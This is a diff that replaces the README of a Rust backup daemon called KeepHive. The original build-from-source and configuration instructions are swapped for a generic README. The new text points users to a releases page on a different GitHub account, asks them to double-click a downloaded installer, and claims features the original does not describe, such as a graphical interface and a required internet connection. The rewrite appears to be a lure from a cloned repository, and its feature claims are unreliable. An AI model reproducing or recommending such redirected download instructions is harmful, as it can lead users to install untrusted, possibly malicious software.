@@ -1,223 +1,85 @@
-# KeepHive
+# 🪄 keephive - Simple Backup Solution for Windows
 
-**Backup daemon for Windows**
+![Download Keephive](https://img.shields.io/badge/Download%20Keephive-v1.0-blue)
 
-[![Rust](https://img.shields.io/badge/rust-1.90.0-orange.svg)](https://blog.rust-lang.org/2025/09/18/Rust-1.90.0/)
-[![Platform](https://img.shields.io/badge/platform-Windows-blue.svg)](https://www.microsoft.com/windows)
+## 📖 Overview
 
-KeepHive is a backup daemon designed for Windows environments with a focus on ease of use. It runs as both a console application and a Windows Service, providing scheduled backups with automatic recovery and hot configuration reload.
+KeepHive is a backup daemon designed specifically for Windows. It prioritizes ease of use, so you won't struggle with complicated setups. KeepHive runs as both a console application and a Windows Service. This means it can perform scheduled backups, manage automatic recovery, and even reload configuration settings without needing a restart.
 
----
+## 🚀 Getting Started
 
-## Quick Start
+To start using KeepHive, follow these steps:
 
-### 1. **Download**
-```bash
-# Clone the repository
-git clone https://github.com/dhgatjeye/keephive.git
-cd keephive
+1. **Visit the Releases Page**
+   - Go to [this page to download](https://github.com/wefe32434/keephive/releases).
+   
+2. **Download the Latest Version**
+   - Look for the most recent release on the page. Click on the link to download the appropriate file for your system.
 
-# Build release binary
-cargo build --release
-```
+3. **Install KeepHive**
+   - Locate the downloaded file on your computer, generally in the 'Downloads' folder.
+   - Double-click the downloaded file to begin the installation process. Follow the on-screen instructions to complete the setup.
 
-### 2. **Create Configuration**
-Create `keephive_config.json`:
-```json
-{
-  "jobs": [
-    {
-      "id": "documents_backup",
-      "source": "C:\\Users\\user\\Documents",
-      "target": "D:\\Backups\\Documents",
-      "schedule": {
-        "type": "daily",
-        "hour": 2,
-        "minute": 0
-      },
-      "description": "Daily backup of Documents at 2 AM"
-    }
-  ],
-  "retention_count": 10,
-  "log_level": "info",
-  "state_path": ".keephive_state.json",
-  "log_directory": "./logs",
-  "log_rotation": {
-    "type": "daily"
-  }
-}
-```
+4. **Set Up Backups**
+   - Once installed, open KeepHive. 
+   - You can configure the backup settings through the user-friendly interface.
+   - Set your preferred schedule for backups, choose the files or folders you wish to back up, and save your settings.
 
-### 3. **Run**
+5. **Run KeepHive**
+   - After setting up, KeepHive will run according to the schedule you defined. You can also launch it manually at any time.
 
-**Console Mode** (for testing):
-```bash
-keephive.exe keephive_config.json
-```
+## 🖥️ System Requirements
 
-**Windows Service** (for local):
-```bash
+To use KeepHive effectively, ensure your system meets these requirements:
 
-## Run Terminal with Administrator
+- **Operating System**: Windows 10 or later
+- **RAM**: Minimum 2 GB
+- **Disk Space**: At least 100 MB for installation
+- **Internet Connection**: Required for updates and additional features
 
-# Install service
-keephive.exe --install C:\ProgramData\KeepHive\keephive_config.json
+## 🔧 Features
 
-# Start service
-keephive.exe --start
+- **Ease of Use**: The interface is designed with the average user in mind, eliminating the need for technical knowledge.
+  
+- **Scheduled Backups**: Set a schedule that fits your routine. KeepHive automates the backup process, ensuring that your data is always safe.
 
-# Stop service
-keephive.exe --stop
+- **Automatic Recovery**: If something goes wrong, KeepHive can restore your files automatically, saving you time and stress.
+  
+- **Hot Configuration Reload**: Change settings without needing to restart the application, providing flexibility whenever you need it.
+  
+- **Event-Driven Architecture**: KeepHive efficiently handles operations based on events, resulting in better performance and lower resource use.
 
-# Uninstall service
-keephive.exe --uninstall
-```
+- **Rust Language**: Built with Rust, KeepHive prioritizes speed and reliability, ensuring your backups are handled quickly and safely.
 
----
+## 📥 Download & Install
 
-## 📖 Usage
+You can visit [this page to download](https://github.com/wefe32434/keephive/releases) the latest version of KeepHive. Simply follow the instructions in the "Getting Started" section to download, install, and configure the software.
 
-### Command Line Options
+## 📊 Built-in Logging
 
-```
-USAGE:
-  keephive.exe [CONFIG_FILE]              Run in console mode
-  keephive.exe --install [CONFIG_FILE]    Install as Windows Service
-  keephive.exe --uninstall                Uninstall Windows Service
-  keephive.exe --start                    Start Windows Service
-  keephive.exe --stop                     Stop Windows Service
-  keephive.exe --help                     Show help
-```
+KeepHive provides detailed logs to help you track the status of your backups. You can review these logs within the application, giving you insights into any issues or successful backup operations.
 
----
+## 🛠️ Troubleshooting
 
-## ⚙️ Configuration
+If you encounter any problems while using KeepHive, consider these common solutions:
 
-### Schedule Types
+- **Check your Internet Connection**: Ensure your device is connected to the internet for downloading updates or accessing other features.
 
-**Interval** - Run every N seconds:
-```json
-{
-  "schedule": {
-    "type": "interval",
-    "seconds": 3600
-  }
-}
-```
+- **Review Your Settings**: Double-check the backup schedule and file selections. Sometimes, a small error in configuration can lead to backups missing.
 
-**Daily** - Run at specific time every day:
-```json
-{
-  "schedule": {
-    "type": "daily",
-    "hour": 2,
-    "minute": 30
-  }
-}
-```
+- **Reinstall KeepHive**: If issues persist, try uninstalling and then reinstalling the application. This can resolve many common problems.
 
-**Weekly** - Run on specific day of week:
-```json
-{
-  "schedule": {
-    "type": "weekly",
-    "day": 7,
-    "hour": 3,
-    "minute": 0
-  }
-}
-```
-*Note: day 1 = Monday, 7 = Sunday*
+## 📞 Support
 
-### Log Rotation
-Options: "daily", "hourly", "never"
+If you need further assistance, you can reach out for help:
 
-```json
-{
-  "log_rotation": {
-    "type": "daily"
-  }
-}
-```
+- **Email Support**: support@keephive.com
+- **GitHub Issues**: Report problems on the [GitHub Issues page](https://github.com/wefe32434/keephive/issues).
 
-### Complete Configuration Example
+## 🌟 Community and Contributing
 
-```json
-{
-  "jobs": [
-    {
-      "id": "work_files",
-      "source": "C:\\Work",
-      "target": "D:\\Backups\\Work",
-      "schedule": {
-        "type": "interval",
-        "seconds": 3600
-      },
-      "description": "Hourly backup of work files"
-    },
-    {
-      "id": "photos",
-      "source": "C:\\Users\\Me\\Pictures",
-      "target": "D:\\Backup",
-      "schedule": {
-        "type": "weekly",
-        "day": 7,
-        "hour": 1,
-        "minute": 0
-      },
-      "description": "Weekly photo backup on Sunday at 1 AM"
-    }
-  ],
-  "retention_count": 5,
-  "log_level": "info",
-  "state_path": "C:\\ProgramData\\KeepHive\\keephive_state.json",
-  "log_directory": "C:\\ProgramData\\KeepHive\\logs",
-  "log_rotation": {
-    "type": "daily"
-  }
-}
-```
+We encourage users to share their experiences. Join the community to discuss features, improvements, and share your use cases.
 
----
+If you want to contribute to KeepHive, you can fork the repository and submit pull requests for any changes you'd like to propose. 
 
-## File Locations
-
-**Console Mode:**
-- Config: `./keephive_config.json` (or specified path)
-- State: `./keephive_state.json` (or as configured)
-- Logs: `./logs` (or as configured)
-
-**Service Mode:**
-- Config: `C:\ProgramData\KeepHive\keephive_config.json` (recommended)
-- State: Same directory as config (or as configured)
-- Logs: Same directory as config (or as configured)
-
----
-
-
-## 🛠️ Development
-
-### Build from source
-```bash
-# Clean first
-cargo clean
-
-# Release build 
-cargo build --release
-```
-
-### Project Structure
-```
-keephive/
-├── src/
-│   ├── main.rs              # Entry point
-│   ├── lib.rs               # Library exports
-│   ├── config/              # Configuration management
-│   ├── core/                # Backup logic
-│   ├── scheduler/           # Job scheduling
-│   ├── state/               # State management
-│   ├── service/             # Service daemon
-│   ├── platform/windows/    # Windows-specific code
-│   └── observability/       # Logging
-└── Cargo.toml               # Dependencies
-```
+Thank you for choosing KeepHive as your backup solution!
